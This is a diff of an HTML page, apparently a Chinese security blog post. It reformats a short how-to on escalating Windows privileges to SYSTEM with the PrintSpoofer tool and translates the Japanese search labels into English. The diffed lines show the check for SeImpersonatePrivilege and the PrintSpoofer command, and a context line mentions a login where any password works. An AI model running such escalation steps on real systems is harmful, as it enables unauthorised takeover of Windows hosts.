@@ -160,13 +160,16 @@ windows Server 2019
 全补丁的情况都测试成功了。
 工具GitHub上有源码，自行编译即可
 具体操作cmd运行 
-1whoami               #查看权限
+
+whoami               #查看权限
 
 
-1whoami /priv         #查看是否具有SeImpersonatePrivilege权限
+
+whoami /priv         #查看是否具有SeImpersonatePrivilege权限
 
 
-1PrintSpoofer.exe -i -c "whoami"      #查看权限是否提升为system
+
+PrintSpoofer.exe -i -c “whoami”      #查看权限是否提升为system
 
 
 </div>
@@ -378,7 +381,7 @@ password随便输就行（具体为何随便输就可以去了解原理就懂，
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">検索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -387,7 +390,7 @@ password随便输就行（具体为何随便输就可以去了解原理就懂，
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
           <label data-error="x" data-success="v"
-                 for="local-search-input">キーワード</label>
+                 for="local-search-input">keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
